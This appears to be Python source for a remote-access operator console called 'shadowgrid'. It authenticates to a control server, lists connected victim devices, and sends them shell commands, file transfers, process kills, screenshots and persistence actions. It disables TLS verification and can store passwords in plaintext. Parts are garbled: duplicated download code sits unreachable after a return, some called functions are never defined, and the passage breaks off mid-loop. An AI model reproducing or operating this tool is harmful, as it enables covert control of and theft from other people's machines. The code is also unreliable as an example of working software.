# -*- coding: utf-8 -*-
import urllib.request
import json
import os
import sys
import time
import base64
import getpass
import requests
import ssl
import subprocess
import math
# 尝导入readline和其他高级库来支持完整功能
try:
    import readline  # 为了支持命令历史
    HAS_READLINE = True
except ImportError:
    HAS_READLINE = False
    print("[警告] readline不支持，使用标准输入")
try:
    import configparser  # 用于配置文件管理
except ImportError:
    print("[警告] configparser 不支持")
from pathlib import Path
# Enable ANSI escape codes on Windows
if os.name == 'nt':
    # Method 1: os.system trick (most reliable)
    os.system('')
    # Method 2: ctypes (backup)
    try:
        import ctypes
        kernel32 = ctypes.windll.kernel32
        kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
    except Exception:
        pass  # Ignore if fails
# 配置文件路径定义
CONFIG_DIR = Path.home() / ".shadowgrid"
CONFIG_FILE = CONFIG_DIR / "config.ini"
HISTORY_FILE = CONFIG_DIR / "history"
SERVER_URL = None
SESSION_AUTH = None
CLIENTS = {}
CURRENT_DEVICE = None
CURRENT_HOSTNAME = ""
CURRENT_PATH = os.getcwd().replace('/', '\\')
# 配置和历史变量
CONFIG = {}
CMD_HISTORY = []
def load_config():
    """加载配置文件"""
    global CONFIG
    CONFIG = {"server_url": "", "last_client_id": "", "last_hostname": ""}
    if not CONFIG_DIR.exists():
        CONFIG_DIR.mkdir(parents=True, exist_ok=True)
    if CONFIG_FILE.exists():
        try:
            config_parser = configparser.ConfigParser()
            config_parser.read(CONFIG_FILE, encoding='utf-8')
            if 'shadowgrid' in config_parser:
                section = config_parser['shadowgrid']
                CONFIG = {
                    "server_url": section.get('server_url', ''),
                    "last_password": section.get('last_password', ''),
                    "last_client_id": section.get('last_client_id', ''),
                    "last_hostname": section.get('last_hostname', ''),
                    "auto_remember_password": section.getboolean('auto_remember_password', fallback=False),
                }
        except Exception:
            pass  # 如果配置文件损坏则使用默认配置
    # 加载命令历史
    if HISTORY_FILE.exists():
        try:
            with open(HISTORY_FILE, 'r', encoding='utf-8') as f:
                if HAS_READLINE:  # 只在readline模块可用时使用
                    import readline
                    for line in f.readlines():
                        line = line.strip()
                        if line:
                            readline.add_history(line)
                            CMD_HISTORY.append(line)
                else:
                    # 如果readline不可用，只加载列表
                    for line in f.readlines():
                        line = line.strip()
                        if line:
                            CMD_HISTORY.append(line)
        except Exception:
            pass
def save_history():
    """保存命令历史到文件"""
    try:
        if not CONFIG_DIR.exists():
            CONFIG_DIR.mkdir(parents=True, exist_ok=True)
        with open(HISTORY_FILE, 'w', encoding='utf-8') as f:
            for cmd in CMD_HISTORY:
                f.write(cmd + '\n')
    except Exception:
        pass  # 历史保存失败不影响正常使用
RESET = "\033[0m"
BOLD = "\033[1m"
ITALIC = "\033[3m"
UNDERLINE = "\033[4m"
GREEN = "\033[92m"
LGREEN = "\033[1;92m"
DGREEN = "\033[2;92m"
BLUE = "\033[94m"
LBLUE = "\033[1;94m"
DBLUE = "\033[2;94m"
YELLOW = "\033[93m"
LYELLOW = "\033[1;93m"
DYELLOW = "\033[2;93m"
RED = "\033[91m"
LRED = "\033[1;91m"
DRED = "\033[2;91m"
PURPLE = "\033[95m"
LPURPLE = "\033[1;95m"
DPURPLE = "\033[2;95m"
CYAN = "\033[96m"
LCYAN = "\033[1;96m"
DCYAN = "\033[2;96m"
GRAY = "\033[90m"
LGRAY = "\033[1;90m"
def get_timestamp():
    return time.strftime("%Y%m%d_%H%M%S")
def clear_screen():
    """清屏"""
    os.system("cls" if os.name == "nt" else "clear")
def format_ls_output(items):
    """格式化ls输出"""
    if not items:
        return
    if not isinstance(items, list):
        return
    for item in items:
        if isinstance(item, dict):
            name = item.get("name", "")
            is_dir = item.get("dir", False)
            if is_dir:
                print(f"{CYAN}  {name}/{RESET}")
            else:
                print(f"{YELLOW}  {name}{RESET}")
        else:
            print(f"  {item}{RESET}")
def print_clients():
    """打印设备列表"""
    if not CLIENTS:
        print(f"{GRAY}[信息]{RESET} 没有已连接的设备")
        return
    print(f"\n{LGREEN}┌─[ 可用设备 ]{RESET}")
    for idx, client in enumerate(CLIENTS, 1):
        cid = client.get("id", "unknown")
        hostname = client.get("hostname", "unknown")
        ip = client.get("ip", "unknown")
        print(f"{BLUE}  {idx}. {LGREEN}{hostname}{RESET} ({CYAN}{ip}{RESET}) {GRAY}[ID: {PURPLE}{cid}{GRAY}]{RESET}")
    print(f"{BLUE}└────────────{RESET}\n")
def req(method, endpoint, data=None):
    """发送HTTP请求"""
    global SESSION_AUTH
    url = f"{SERVER_URL}{endpoint}"
    headers = {"Content-Type": "application/json"}
    body = json.dumps(data).encode() if data else None
    try:
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        request = urllib.request.Request(url, data=body, headers=headers, method=method)
        if SESSION_AUTH:
            auth_str = f"{SESSION_AUTH[0]}:{SESSION_AUTH[1]}"
            auth_b64 = base64.b64encode(auth_str.encode()).decode()
            request.add_header("Authorization", f"Basic {auth_b64}")
        with urllib.request.urlopen(request, context=context, timeout=10.0) as response:
            result = json.loads(response.read().decode())
            return result
    except Exception as e:
        return {"error": str(e)}
def fetch_clients():
    """获取设备列表"""
    global CLIENTS
    try:
        resp = req("GET", "/clients")
        CLIENTS = resp.get("clients", [])
        return CLIENTS
    except Exception as e:
        print(f"{RED}[错误]{RESET} 获取设备列表失败：{e}{RESET}")
        return []
def send_command(client_id, cmd_type, payload=None):
    """发送命令到设备"""
    try:
        data = {"type": cmd_type}
        if payload is not None:
            data["payload"] = payload
        resp = req("POST", f"/command/{client_id}", data)
        return resp
    except Exception as e:
        return {"error": str(e)}
def get_results(client_id):
    """获取命令结果"""
    try:
        resp = req("GET", f"/results/{client_id}")
        return resp.get("results", [])
    except Exception as e:
        # 返回空列表表示获取失败，而不应该立即视为客户端断线
        return []
def wait_for_result(client_id, timeout=1.5):  # 增加默认超时时间以适应较慢的命令
    """等待命令结果"""
    start_time = time.time()
    while time.time() - start_time < timeout:
        try:
            results = get_results(client_id)
            if results:
                return results
        except:
            # 即使请求出现一些暂时问题，也不要立即当作断线
            pass
        time.sleep(0.02)
    return None  # 返回None表示没有结果（超时），由调用方决定是否认为客户端断线
def check_client_online(client_id):
    """检查客户端是否仍然在线，而不是依赖结果等待超时来判断"""
    try:
        # 请求客户端列表检查是否在线
        connected_clients = req("GET", "/clients")
        client_list = connected_clients.get("clients", [])
        for client in client_list:
            if client.get("id") == client_id:
                return True
        return False
    except:
        # 如果无法连接到服务器则假设客户端已离线
        return False
def print_failed_result(r):
    """打印错误结果"""
    err = r.get("error", "")
    result = r.get("result", "")
    if err:
        print(f"{RED}[错误]{RESET} {err}{RESET}")
    elif isinstance(result, str):
        print(f"{GRAY}[结果]{RESET} {result}{RESET}")
def format_file_size(size_bytes):
    """Format bytes to human readable format"""
    if size_bytes == 0:
        return "0B"
    size_names = ["B", "KB", "MB", "GB", "TB"]
    if size_bytes > 0:
        import math
        i = int(math.floor(math.log(size_bytes, 1024)))
        if i >= len(size_names):
            i = len(size_names) - 1
        p = math.pow(1024, i)
        s = round(size_bytes / p, 2)
        return f"{s}{size_names[i]}"
    else:
        return f"{size_bytes}B"
def create_progress_bar(current, total, label="进度", show_percent=True, bar_length=30, style="default", fixed_width=True):
    """
    通用进度条函数，供下载、上传、截图等所有功能调用
    参数:
        current: 当前完成的字节数/数量
        total: 总字节数/数量
        label: 进度条标签（如"下载"、"上传"、"传输"）
        show_percent: 是否显示百分比
        bar_length: 进度条长度（字符数）
        style: 进度条样式 ("default", "simple", "animated")
    返回:
        格式化的进度条字符串
    """
    if total <= 0:
        percent = 0
        bar_length_actual = 0
    else:
        percent = int(min(100, (current / total) * 100))
        bar_length_actual = int(min(bar_length, (current / total) * bar_length))
    # 根据样式选择进度条字符
    if style == "simple":
        fill_char = "▓"
        empty_char = "░"
        indicator = ""
    elif style == "animated":
        fill_char = "▓"
        empty_char = "░"
        # 动画效果：根据当前值奇偶性改变指示符
        indicator = "→" if current % 2 == 0 else "»"
    else:  # default
        fill_char = "█"
        empty_char = "░"
        indicator = "●"
    # 构建进度条
    bar = ""
    for i in range(bar_length):
        if i < bar_length_actual:
            bar += fill_char
        elif i == bar_length_actual and indicator:
            bar += indicator
        else:
            bar += empty_char
    # 格式化输出 - 固定宽度避免晃动
    if show_percent:
        if fixed_width:
            # 固定宽度格式，使用统一的数字宽度
            if total >= 1024*1024*1024:  # GB
                current_str = f"{current/1024/1024/1024:7.2f}GB"
                total_str = f"{total/1024/1024/1024:7.2f}GB"
            elif total >= 1024*1024:  # MB
                current_str = f"{current/1024/1024:7.2f}MB"
                total_str = f"{total/1024/1024:7.2f}MB"
            elif total >= 1024:  # KB
                current_str = f"{current/1024:7.2f}KB"
                total_str = f"{total/1024:7.2f}KB"
            else:  # Bytes
                current_str = f"{current:7.0f}B "
                total_str = f"{total:7.0f}B "
            progress_info = f" {current_str}/{total_str} [{bar}] {percent:3d}%"
        else:
            current_str = format_file_size(current)
            total_str = format_file_size(total)
            progress_info = f" {current_str}/{total_str} [{bar}] {percent}%"
    else:
        progress_info = f" [{bar}]"
    return f"{label}: {progress_info}" if label else progress_info
def create_stream_download_progress_bar(downloaded, total, speed_str):
    """Create a progress bar with animation effect for streaming downloads"""
    progress = create_progress_bar(downloaded, total, label="", style="default")
    return f"{progress} ({speed_str})"
def create_small_file_progress_bar(current, total, file_size_str=None):
    """Create a simple animated progress bar for small files"""
    if file_size_str is None:
        file_size_str = format_file_size(current)
    progress = create_progress_bar(current, total, label="", style="animated")
    # 简化显示
    if total <= 0:
        percent = 0
    else:
        percent = int(min(100, (current / total) * 100))
    return f" {file_size_str} [{progress.split('[')[1].split(']')[0]}] {percent}%"
def stream_download_file(client_id, file_path, save_path):
    """Stream download a large file with progress reporting and integrity verification"""
    # Request initial file info
    send_command(client_id, "stream", {
        "path": file_path, 
        "action": "download_start"
    })
    # Wait for file info
    info_results = wait_for_result(client_id, timeout=5.0)
    if not info_results:
        print(f"{RED}[错误]{RESET} 无法获取文件信息")
        return False
    info = info_results[0]
    if info.get("result_type") != "stream_init":
        # 如果是大文件提示
        if info.get("result_type") == "large_file":
            print(f"{YELLOW}[提示]{RESET} 检测到大文件传输，启动流式下载...")
        else:
            print(f"{RED}[错误]{RESET} 无法获取文件信息: {info.get('result', 'Unknown error')}")
            return False
    # 重新请求文件信息，如果之前返回的是info
    if info.get("result_type") == "large_file":
        send_command(client_id, "stream", {
            "path": file_path, 
            "action": "download_start"
        })
        info_results = wait_for_result(client_id, timeout=5.0)
        if not info_results:
            print(f"{RED}[错误]{RESET} 无法获取文件信息")
            return False
        info = info_results[0]
        if info.get("result_type") != "stream_init":
            print(f"{RED}[错误]{RESET} 无法获取文件信息: {info.get('result', 'Unknown error')}")
            return False
    file_info = info.get("result", {})
    file_size = file_info.get("file_size", 0)
    chunk_size = file_info.get("chunk_size", 1024*256)  # 默认256KB
    total_chunks = file_info.get("total_chunks", 1)
    print(f"\n{LGREEN}[信息]{RESET} 开始下载: {CYAN}{file_path}{RESET} ({format_file_size(file_size)})")
    print(f"{LGREEN}[信息]{RESET} 大件大小: {format_file_size(file_size)}, 分块数: {total_chunks}")
    # 创建目标目录
    os.makedirs(os.path.dirname(save_path), exist_ok=True)
    import time, hashlib
    md5_hash = hashlib.md5()  # 用于校验
    speed_log = []  # 记录速度日志 [time, bytes_downloaded]
    start_time = time.time()
    downloaded_bytes = 0
    try:
        with open(save_path, "wb") as f:
            for chunk_idx in range(total_chunks):
                # 请求特定块
                send_command(client_id, "stream", {
                    "path": file_path,
                    "action": "download_chunk",
                    "chunk_index": chunk_idx,
                    "total_chunks": total_chunks,
                    "chunk_size": chunk_size
                })
                # 等待块数据
                chunk_results = wait_for_result(client_id, timeout=10.0)  # 増加超时时间
                if not chunk_results:
                    print(f"\n{RED}[错误]{RESET} 下载块 {chunk_idx+1}/{total_chunks} 时超时")
                    return False
                chunk_result = chunk_results[0]
                if chunk_result.get("result_type") != "file_chunk":
                    print(f"\n{RED}[错误]{RESET} 下載塊 {chunk_idx+1}/{total_chunks} 時出錯: {chunk_result.get('result', 'Unknown error')}")
                    return False
                chunk_data = chunk_result.get("result", {}).get("chunk_data", "")
                try:
                    chunk_binary = base64.b64decode(chunk_data)
                    f.write(chunk_binary)
                    chunk_bytes = len(chunk_binary)
                    downloaded_bytes += chunk_bytes
                    md5_hash.update(chunk_binary)  # 计算校验和
                    # Calculate speed (average of last 5 seconds)
                    current_time = time.time()
                    speed_log.append([current_time, chunk_bytes])
                    # Keep only entries from last 10 seconds
                    speed_log = [[t, b] for t, b in speed_log if current_time - t < 10]
                    # Calculate average speed
                    if speed_log and (current_time - speed_log[0][0]) > 0:
                        time_diff = current_time - speed_log[0][0]
                        bytes_per_sec = sum(b for _, b in speed_log) / time_diff
                        speed_str = f"{format_file_size(int(bytes_per_sec))}/s"
                    else:
                        speed_str = "0B/s"
                    # Update progress
                    progress_line = create_stream_download_progress_bar(downloaded_bytes, file_size, speed_str)
                    print(f"\r{CYAN}[下载]{RESET} {progress_line}", end="", flush=True)
                except Exception as e:
                    print(f"\n{RED}[错误]{RESET} 解码块数据时出错: {e}")
                    return False
        print(f"\n\n{LGREEN}[完成]{RESET} 文件下载完成: {CYAN}{save_path}{RESET}")
        # Perform integrity verification
        calculated_md5 = md5_hash.hexdigest()
        # Send integrity check command to compare remote and local hash
        import hashlib
        # Calculate local file MD5 hash for verification
        with open(save_path, "rb") as f:
            local_file_hash = hashlib.md5()
            # Read file in chunks to avoid memory issues with large files
            while True:
                chunk = f.read(chunk_size)
                if not chunk:
                    break
                local_file_hash.update(chunk)
            local_md5 = local_file_hash.hexdigest()
        if calculated_md5 == local_md5:
            print(f"{LGREEN}[✓ 校验]{RESET} 文件完整性校验成功")
        else:
            print(f"{RED}[✗ 校验]{RESET} 文件损坏，MD5哈希不匹配!")
            return False
        total_time = time.time() - start_time
        avg_speed = f"{format_file_size(int(downloaded_bytes / total_time))}/s" if total_time > 0 else "0B/s"
        print(f"{LGREEN}[統计]{RESET} 文件: {format_file_size(downloaded_bytes)}, 耗时: {total_time:.2f}s, 速度: {avg_speed}, 校验: √")
        return True
    except Exception as e:
        print(f"\n{RED}[错误]{RESET} 下载文件时出错: {e}")
        import traceback
        traceback.print_exc()
        return False
def create_upload_progress_bar(uploaded, total, speed_str):
    """Create a progress bar for streaming uploads"""
    if total <= 0:
        percent = 0
        bar_length = 0
    else:
        percent = int(min(100, (uploaded / total) * 100))
        bar_length = int(min(30, (uploaded / total) * 30)) if total > 0 else 0
    bar = ""
    for i in range(30):
        if i < bar_length:
            bar += "█"
        elif i == bar_length:
            bar += "○"
        else:
            bar += "░"
    uploaded_str = format_file_size(uploaded)
    total_str = format_file_size(total)
    return f" {uploaded_str}/{total_str} [{bar}] {percent}% ({speed_str})"
def stream_upload_file(client_id, local_file, remote_path):
    """Stream upload a large file with progress reporting and integrity verification"""
    import hashlib, time
    # Calculate local file hash before uploading
    file_hash_calc = hashlib.md5()
    with open(local_file, "rb") as f:
        while True:
            chunk = f.read(1024 * 512)  # 512KB chinks
            if not chunk:
                break
            file_hash_calc.update(chunk)
    original_hash = file_hash_calc.hexdigest()
    file_size = os.path.getsize(local_file)
    chunk_size = 1024 * 1024  # 1MB - 提升速度
    total_chunks = (file_size + chunk_size - 1) // chunk_size  # 向上取整
    print(f"\n{LGREEN}[信息]{RESET} 开始上传: {CYAN}{local_file}{RESET} -> {CYAN}{remote_path}{RESET} ({format_file_size(file_size)})")
    print(f"{LGREEN}[信息]{RESET} 文件大小: {format_file_size(file_size)}, 分块数: {total_chunks}")
    # Verify file exists before upload
    if not os.path.exists(local_file):
        print(f"\n{RED}[错误]{RESET} 本地文件不存在")
        return False
    speed_log = []
    start_time = time.time()
    uploaded_bytes = 0
    try:
        with open(local_file, "rb") as f:
            for chunk_idx in range(total_chunks):
                # Read chunk
                f.seek(chunk_idx * chunk_size)
                chunk_data = f.read(chunk_size)
                chunk_bytes = len(chunk_data)
                # Encode chunk
                encoded_chunk = base64.b64encode(chunk_data).decode()
                # Initialize uploading (on first chunk)
                if chunk_idx == 0:
                    send_command(client_id, "stream", {
                        "path": remote_path,
                        "action": "upload_start"
                    })
                    # Wait for ready confirmation
                    init_results = wait_for_result(client_id, timeout=5.0)
                    if not init_results:
                        print(f"\n{RED}[错误]{RESET} 上传初始化失败")
                        return False
                # Upload this chunk
                send_command(client_id, "stream", {
                    "path": remote_path,
                    "action": "upload_chunk", 
                    "chunk_index": chunk_idx,
                    "data": encoded_chunk
                })
                # Wait for ACK
                ack_results = wait_for_result(client_id, timeout=10.0)
                if not ack_results:
                    print(f"\n{RED}[错误]{RESET} 上传块 {chunk_idx+1}/{total_chunks} 时超时")
                    return False
                ack_result = ack_results[0]
                if ack_result.get("result_type") != "chunk_ack":
                    print(f"\n{RED}[错误]{RESET} 上传块 {chunk_idx+1}/{total_chunks} 时出错: {ack_result.get('result', 'Unknown error')}")
                    return False
                uploaded_bytes += chunk_bytes
                # Calculate speed
                current_time = time.time()
                speed_log.append([current_time, chunk_bytes])
                # Keep track of speeds in last 10 seconds
                speed_log = [[t, b] for t, b in speed_log if current_time - t < 10]
                # Calculate average speed
                if speed_log and (current_time - speed_log[0][0]) > 0:
                    time_diff = current_time - speed_log[0][0]
                    bytes_per_sec = sum(b for _, b in speed_log) / time_diff
                    speed_str = f"{format_file_size(int(bytes_per_sec))}/s"
                else:
                    speed_str = "0B/s"
                # Show progress
                progress_line = create_upload_progress_bar(uploaded_bytes, file_size, speed_str)
                print(f"\r{LGREEN}[上传]{RESET} {progress_line}", end="", flush=True)
        print(f"\n\n{LGREEN}[完成]{RESET} 文件上传完毕: {CYAN}{local_file} -> {remote_path}{RESET}")
        total_time = time.time() - start_time
        avg_speed = f"{format_file_size(int(uploaded_bytes / total_time))}/s" if total_time > 0 else "0B/s"
        print(f"{LGREEN}[统计]{RESET} 大件: {format_file_size(uploaded_bytes)}, 耗时: {total_time:.2f}s, 速度: {avg_speed}")
        return True
    except Exception as e:
        print(f"\n{RED}[错误]{RESET} 上传文件时出错: {e}")
        import traceback
        traceback.print_exc()
        return False
    info = info_results[0]
    if info.get("result_type") != "stream_init":
        # 如果服务端返回large_file类型，说明超过了阈值
        if info.get("result_type") == "large_file":
            print(f"{YELLOW}[提示]{RESET} 检测到大文件传输，启动流式下载...")
        else:
            print(f"{RED}[错误]{RESET} 无法获取文件信息: {info.get('result', 'Unknown error')}")
            return False
    # 重新请求文件信息，如果之前返回的是info
    if info.get("result_type") == "large_file":
        send_command(client_id, "stream", {
            "path": file_path, 
            "action": "download_start"
        })
        info_results = wait_for_result(client_id, timeout=5.0)
        if not info_results:
            print(f"{RED}[错误]{RESET} 无法获取文件信息")
            return False
        info = info_results[0]
        if info.get("result_type") != "stream_init":
            print(f"{RED}[错误]{RESET} 无法获取文件信息: {info.get('result', 'Unknown error')}")
            return False
    file_info = info.get("result", {})
    file_size = file_info.get("file_size", 0)
    chunk_size = file_info.get("chunk_size", 1024*256)  # 默认256KB
    total_chunks = file_info.get("total_chunks", 1)
    print(f"{LGREEN}[信息]{RESET} 开始下载文件: {CYAN}{file_path}{RESET} ({format_file_size(file_size)})")
    print(f"{LGREEN}[信息]{RESET} 文件大小: {format_file_size(file_size)}, 分块数: {total_chunks}")
    # 创建目标目录
    os.makedirs(os.path.dirname(save_path), exist_ok=True)
    import time
    speed_log = []  # 记录速度日志 [time, bytes_downloaded]
    start_time = time.time()
    downloaded_bytes = 0
    try:
        with open(save_path, "wb") as f:
            for chunk_idx in range(total_chunks):
                # 请求特定块
                send_command(client_id, "stream", {
                    "path": file_path,
                    "action": "download_chunk",
                    "chunk_index": chunk_idx,
                    "total_chunks": total_chunks,
                    "chunk_size": chunk_size
                })
                # 等待块数据
                chunk_results = wait_for_result(client_id, timeout=10.0)  # 増加超时时间
                if not chunk_results:
                    print(f"\n{RED}[错误]{RESET} 下载块 {chunk_idx+1}/{total_chunks} 时超时")
                    return False
                chunk_result = chunk_results[0]
                if chunk_result.get("result_type") != "file_chunk":
                    print(f"\n{RED}[错误]{RESET} 下載塊 {chunk_idx+1}/{total_chunks} 時出錯: {chunk_result.get('result', 'Unknown error')}")
                    return False
                chunk_data = chunk_result.get("result", {}).get("chunk_data", "")
                try:
                    chunk_binary = base64.b64decode(chunk_data)
                    f.write(chunk_binary)
                    chunk_bytes = len(chunk_binary)
                    downloaded_bytes += chunk_bytes
                    # Calculate speed (average of last 5 seconds)
                    current_time = time.time()
                    speed_log.append([current_time, chunk_bytes])
                    # Keep only entries from last 10 seconds
                    speed_log = [[t, b] for t, b in speed_log if current_time - t < 10]
                    # Calculate average speed
                    if speed_log and (current_time - speed_log[0][0]) > 0:
                        time_diff = current_time - speed_log[0][0]
                        bytes_per_sec = sum(b for _, b in speed_log) / time_diff
                        speed_str = f"{format_file_size(int(bytes_per_sec))}/s"
                    else:
                        speed_str = "0B/s"
                    # Update progress
                    progress_line = create_stream_download_progress_bar(downloaded_bytes, file_size, speed_str)
                    print(f"\r{CYAN}[下载]{RESET} {progress_line}{RESET}", end="", flush=True)
                except Exception as e:
                    print(f"\n{RED}[错误]{RESET} 解码块数据时出错: {e}")
                    return False
        print(f"\n{LGREEN}[成功]{RESET} 文件下载完毕: {CYAN}{save_path}{RESET}")
        total_time = time.time() - start_time
        avg_speed = format_file_size(int(downloaded_bytes / total_time)) + "/s" if total_time > 0 else "0B/s"
        print(f"{LGREEN}[统计]{RESET} 总计: {format_file_size(downloaded_bytes)}, 耗时: {total_time:.2f}s, 平均速度: {avg_speed}")
        return True
    except Exception as e:
        print(f"\n{RED}[错误]{RESET} 下载文件时出错: {e}")
        return False
def print_help():
    """打印帮助"""
    print(f"\n{LGREEN}可用命令：{RESET}")
    print(f"  {YELLOW}list{RESET}              {LGREEN}列出所有可用设备{RESET}")
    print(f"  {YELLOW}use <编号>{RESET}          {LGREEN}选择设备{RESET}")
    print(f"  {YELLOW}back{RESET}              {LGREEN}返回设备列表{RESET}")
    print(f"  {YELLOW}clear{RESET}             {LGREEN}清屏{RESET}")
    print(f"  {YELLOW}history{RESET}           {LGREEN}查看命令历史{RESET}")
    print(f"  {YELLOW}history -c{RESET}        {LGREEN}清除命令历史{RESET}")
    print(f"  {YELLOW}!!{RESET}                {LGREEN}执行上一条命令（待完善）{RESET}")
    print(f"  {YELLOW}help{RESET}              {LGREEN}显示帮助{RESET}")
    print(f"  {YELLOW}quit{RESET}              {LRED}退出{RESET}")
    print("")
    print(f"{BLUE}设备命令：{RESET}")
    print(f"  {YELLOW}ls [路径]{RESET}         {LGREEN}列出目录{RESET}")
    print(f"  {YELLOW}cd <目录>{RESET}         {LGREEN}切换目录{RESET}")
    print(f"  {YELLOW}pwd{RESET}               {LGREEN}显示当前目录{RESET}")
    print(f"  {YELLOW}cat <文件>{RESET}        {LGREEN}查看文件{RESET}")
    print(f"  {YELLOW}dl <文件> [目录]{RESET}   {LGREEN}下载{RESET}")
    print(f"  {YELLOW}ud <文件> [目录]{RESET}   {LGREEN}上传{RESET}")
    print(f"  {YELLOW}rm <路径> [-r]{RESET}    {LRED}删除{RESET}")
    print(f"  {YELLOW}mv <源> <目标>{RESET}    {LGREEN}移动{RESET}")
    print(f"  {YELLOW}file <路径>{RESET}       {LGREEN}查看类型{RESET}")
    print(f"  {YELLOW}find <模式> [-t]{RESET}  {LGREEN}查找{RESET}")
    print(f"  {YELLOW}shell <命令>{RESET}      {LGREEN}执行命令{RESET}")
    print(f"  {YELLOW}ps{RESET}                {LGREEN}查看进程{RESET}")
    print(f"  {YELLOW}kill <PID>{RESET}        {LGREEN}终止进程{RESET}")
    print(f"  {YELLOW}persist <action>{RESET}   {LGREEN}持久化管理{RESET}")
    print(f"  {YELLOW}screenshot{RESET}         {LGREEN}截图{RESET}")
    print(f"  {YELLOW}help{RESET}              {LGREEN}显示帮助{RESET}")
    print(f"  {YELLOW}back{RESET}              {LGREEN}返回{RESET}")
def prompt_config():
    """配置服务器地址"""
    global SERVER_URL
    # 尝试从配置文件获取上次的服务器地址，默认为空
    last_server = CONFIG.get("server_url", "")
    if last_server:
        print(f"{GRAY}[配置]{RESET} 使用上次连接的服务器地址: {LGREEN}{last_server}{RESET}")
        use_last = input(f"{GRAY}[配置]{RESET} 是否使用上次地址? (Y/n): ").strip().lower()
        if use_last != 'n':
            SERVER_URL = last_server
            return
    print(f"{GRAY}[配置]{RESET} 请输入服务器地址 (默认: {LYELLOW}https://127.0.0.1:8444{RESET}):")
    user_input = input(f"{LYELLOW}> {RESET}").strip()
    SERVER_URL = user_input if user_input else "https://127.0.0.1:8444"
    # 更新配置并保存
    CONFIG["server_url"] = SERVER_URL
    save_config(CONFIG)
    print(f"{GRAY}[配置]{RESET} 使用服务器: {LGREEN}{SERVER_URL}{RESET}")
def login():
    """登录认证"""
    global SESSION_AUTH
    tries = 0
    max_tries = 3
    # 检查上次保存的密码是否可以使用
    if CONFIG.get("auto_remember_password", False) and CONFIG.get("last_password", "") != "":
        password = CONFIG["last_password"]
        remember_choice = input(f"{GRAY}[登录]{RESET} 使用保存的密码重新登录? (Y/n): ").strip().lower()
        if remember_choice != 'n':
            try:
                auth_b64 = base64.b64encode(f"admin:{password}".encode()).decode()
                response = requests.post(
                    f"{SERVER_URL}/login",
                    headers={"Authorization": f"Basic {auth_b64}"},
                    verify=False,
                    timeout=10
                )
                if response.status_code == 200:
                    data = response.json()
                    if data.get("status") == "ok":
                        print(f"{LGREEN}[登录]{RESET} {BOLD}认证成功（使用缓存密码）{RESET}")
                        SESSION_AUTH = ("admin", password)
                        return True
                    else:
                        print(f"{RED}[登录]{RESET} {BOLD}认证失败{RESET}，请重新输入密码")
                else:
                    print(f"{RED}[登录]{RESET} HTTP {response.status_code}，请重新输入密码")
            except Exception as e:
                print(f"{RED}[登录]{RESET} 错误: {e}，请重新输入密码")
    while tries < max_tries:
        print(f"{GRAY}[登录]{RESET} 请输入密码 (剩余尝试次数: {max_tries - tries}):")
        password = getpass.getpass(f"{LYELLOW}> {RESET}")
        try:
            auth_b64 = base64.b64encode(f"admin:{password}".encode()).decode()
            response = requests.post(
                f"{SERVER_URL}/login",
                headers={"Authorization": f"Basic {auth_b64}"},
                verify=False,
                timeout=10
            )
            if response.status_code == 200:
                data = response.json()
                if data.get("status") == "ok":
                    print(f"{LGREEN}[登录]{RESET} {BOLD}认证成功{RESET}")
                    # 询问是否保存密码
                    save_choice = input(f"{GRAY}[登录]{RESET} 是否记住密码? (Y/n): ").strip().lower()
                    if save_choice != 'n':
                        CONFIG["last_password"] = password
                        CONFIG["auto_remember_password"] = "true"
                        save_config(CONFIG)
                    SESSION_AUTH = ("admin", password)
                    return True
                else:
                    print(f"{RED}[登录]{RESET} {BOLD}认证失败{RESET}")
                    tries += 1
            else:
                print(f"{RED}[登录]{RESET} HTTP {response.status_code}")
                tries += 1
        except Exception as e:
            print(f"{RED}[登录]{RESET} 错误: {e}")
            tries += 1
        if tries < max_tries:
            print(f"{GRAY}[登录]{RESET} 请重试...")
    print(f"{RED}[登录]{RESET} {BOLD}认证失败次数过多，程序退出{RESET}")
    return False
def interaction_loop(client_id, hostname):
    """设备交互循环"""
    global CURRENT_DEVICE, CURRENT_HOSTNAME, CURRENT_PATH
    
    
    CURRENT_DEVICE = client_id
    CURRENT_HOSTNAME = hostname
    CURRENT_PATH = os.getcwd().replace('/', '\\')
    print(f"{LGREEN}┌─[ 连接成功 ]{RESET}")
    print(f"{GRAY}│{RESET} 已连接到设备: {CYAN}{hostname}{RESET} ({PURPLE}ID: {client_id}{PURPLE}){RESET}")
    print(f"{GRAY}├{RESET} 输入 '{YELLOW}back{RESET}' 返回设备列表")
    print(f"{GRAY}└{RESET} 输入 '{YELLOW}help{RESET}' 查看可用命令")
    # 获取远程系统信息
    send_command(client_id, "shell", "hostname")
    time.sleep(0.5)
    remote_hostname = ""
    for r in get_results(client_id):
        if r.get("result_type") == "shell":
            remote_hostname = r.get("result", "").strip()
    send_command(client_id, "shell", "whoami")
    time.sleep(0.5)
    remote_user = ""
    for r in get_results(client_id):
        if r.get("result_type") == "shell":
            remote_user = r.get("result", "").strip().split('\\')[-1].split('/')[-1]
    while True:
        try:
            prompt = f"{BLUE}┌──({LGREEN}{remote_user}{RESET}@{PURPLE}{remote_hostname}{RESET})-[{CYAN}{CURRENT_PATH}{RESET}]{RESET}\n{BLUE}└─# {LGREEN}>{RESET} "
            cmd_input = input(prompt).strip()
        except EOFError:
            print(f"\n{GRAY}[信息]{RESET} 退出中...")
            return
        except KeyboardInterrupt:
            print(f"\n{GRAY}[信息]{RESET} 使用 '{YELLOW}quit{RESET}' 退出")
            continue
        # 记录命令到历史 (同样在此循环中也记录)
        apply_readline_history(cmd_input)
        if not cmd_input:
            continue
        parts = cmd_input.split(maxsplit=1)
        cmd = parts[0].lower()
        arg = parts[1] if len(parts) > 1 else None
        if cmd == "quit":
            print(f"{GRAY}[信息]{RESET} 退出中...")
            sys.exit(0)
        elif cmd == "back":
            print(f"{GRAY}[信息]{RESET} 返回设备列表中...")
            CURRENT_DEVICE = None
            CURRENT_HOSTNAME = ""
            # 检测到离线时退出当前控制状态并刷新设备列表
            print(f"{LGREEN}[信息]{RESET} 更新设备列表...")
            try:
                fetch_clients()
                if CLIENTS:
                    print_clients()
                else:
                    print(f"{GRAY}[信息]{RESET} 暂无已连接的设备")
            except Exception as e:
                print(f"{RED}[错误]{RESET} 获取设备列表失败: {e}")
            return
        elif cmd == "clear":
            clear_screen()
        elif cmd == "list":
            try:
                fetch_clients()
                if CLIENTS:
                    print_clients()
                else:
                    print(f"{GRAY}[信息]{RESET} 暂无已连接的设备")
            except Exception as e:
                print(f"{RED}[错误]{RESET} 获取设备列表失败: {e}")
